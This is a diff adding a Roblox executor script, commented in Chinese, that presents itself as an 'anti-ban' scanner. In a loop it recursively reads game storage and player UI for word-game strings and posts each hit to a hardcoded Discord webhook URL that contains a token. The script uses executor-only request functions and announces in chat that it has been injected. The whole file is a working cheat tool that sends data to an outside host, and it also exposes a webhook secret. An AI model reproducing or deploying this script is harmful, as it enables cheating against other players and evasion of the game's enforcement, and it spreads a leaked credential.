@@ -1,0 +1,147 @@
+-- 0x商城 - 全域參數掃描器（防封鎖、內建聊天室提示增強版）
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local localPlayer = Players.LocalPlayer
+
+-- 你提供的新 Webhook 網址
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1509929090164064316/01cHmzEl0q_vsmEomnjZiPmaPtsd1Y6hoyMdEOvBV8K7jke8tQLv9Dns1bmmfntok2Ip"
+
+-- 儲存已發送數據的快取
+local sentDataCache = {}
+
+-- 本地聊天室通知函數（方便你在遊戲內肉眼確認腳本狀態）
+local function notifyInChat(text, color)
+	pcall(function()
+		StarterGui:SetCore("ChatMakeSystemMessage", {
+			Text = "⚙️ [0x商城] " .. text,
+			Color = color or Color3.fromRGB(0, 255, 255),
+			Font = Enum.Font.SourceSansBold,
+			TextSize = 16
+		})
+	end)
+end
+
+-- 核心過濾函數：檢查字串是否符合拼字遊戲特徵
+local function isValidWord(val)
+	local str = tostring(val)
+	
+	if #str <= 1 then return false end
+	if string.match(str, "%d") then return false end -- 刪除包含數字的值
+	if str == "Classic" then return false end -- 刪除值為 Classic 的值
+	if str == "Label" or str == "Text" or str == "TextBox" then return false end
+	
+	return string.match(str, "%a+") ~= nil
+end
+
+-- 發送 Webhook 函數（帶有限流與除錯提示）
+local function sendWebhook(infoType, path, value)
+	local cacheKey = path .. tostring(value)
+	if sentDataCache[cacheKey] then return end -- 數值沒變就跳過
+	sentDataCache[cacheKey] = true
+
+	-- 遊戲內實時提示（讓你確認腳本有抓到東西並正在發送）
+	notifyInChat("發送數據中: " .. tostring(value), Color3.fromRGB(255, 255, 0))
+
+	local httpService = game:GetService("HttpService")
+	local embedData = {
+		["embeds"] = {{
+			["title"] = "🎯 0x商城 - 拼字遊戲候選參數回報",
+			["color"] = 65535,
+			["fields"] = {
+				{["name"] = "📁 參數類型", ["value"] = "`" .. infoType .. "`", ["inline"] = true},
+				{["name"] = "🔑 參數路徑", ["value"] = "```lua\n" .. path .. "\n```", ["inline"] = false},
+				{["name"] = "📊 目前純英文字串", ["value"] = "```\n" .. tostring(value) .. "\n```", ["inline"] = false}
+			},
+			["timestamp"] = DateTime.now():ToIsoDate()
+		}}
+	}
+
+	local jsonPayload = httpService:JSONEncode(embedData)
+	local sendRequest = request or http_request or (syn and syn.request)
+	
+	if sendRequest then
+		task.spawn(function()
+			local success, res = pcall(function()
+				return sendRequest({
+					Url = WEBHOOK_URL,
+					Method = "POST",
+					Headers = {["Content-Type"] = "application/json"},
+					Body = jsonPayload
+				})
+			end)
+			
+			if success and res then
+				if res.StatusCode == 429 then
+					warn("0xShop: 被 Discord 限流了 (Rate Limited)！")
+					notifyInChat("發送失敗：Discord 速度限制中，稍後自動重試。", Color3.fromRGB(255, 0, 0))
+				elseif res.StatusCode == 204 or res.StatusCode == 200 then
+					print("0xShop: Webhook 發送成功！")
+				else
+					warn("0xShop: 發送失敗，狀態碼: " .. tostring(res.StatusCode))
+				end
+			else
+				warn("0xShop: 網路請求異常: " .. tostring(res))
+			end
+		end)
+	else
+		notifyInChat("錯誤：你的工具不支援 request 函數！", Color3.fromRGB(255, 0, 0))
+	end
+end
+
+-- 深度遞迴掃描函數
+local function deepScan(object)
+	local success, children = pcall(function() return object:GetChildren() end)
+	if not success or not children then return end
+
+	for _, child in ipairs(children) do
+		-- 1. 檢查 ValueBase
+		if child:IsA("ValueBase") then
+			local val = child.Value
+			if isValidWord(val) then
+				sendWebhook("ValueObject (" .. child.ClassName .. ")", child:GetFullName(), val)
+			end
+		end
+
+		-- 2. 檢查 UI 文字
+		if child:IsA("TextLabel") or child:IsA("TextBox") or child:IsA("TextButton") then
+			local text = child.Text
+			if isValidWord(text) then
+				sendWebhook("UI Text (" .. child.ClassName .. ")", child:GetFullName(), text)
+			end
+		end
+
+		-- 3. 檢查 Attributes
+		local attributes = child:GetAttributes()
+		if next(attributes) ~= nil then
+			for attrName, attrValue in pairs(attributes) do
+				if isValidWord(attrValue) then
+					local path = child:GetFullName() .. " -> [Attribute: " .. attrName .. "]"
+					sendWebhook("Instance Attribute", path, attrValue)
+				end
+			end
+		end
+
+		deepScan(child)
+	end
+end
+
+-- 啟動流程
+task.spawn(function()
+	-- 確保玩家加載完成
+	if not game:IsLoaded() then game.Loaded:Wait() end
+	task.wait(1)
+	
+	notifyInChat("防封鎖全域掃描器已成功注入！正在巡邏...", Color3.fromRGB(0, 255, 128))
+	print("📡 0x商城 - 監測雷達已啟動...")
+	
+	while true do
+		deepScan(ReplicatedStorage)
+		deepScan(localPlayer)
+		if localPlayer:FindFirstChild("PlayerGui") then
+			deepScan(localPlayer.PlayerGui)
+		end
+		
+		task.wait(3) -- 每 3 秒全面巡邏一次
+	end
+end)
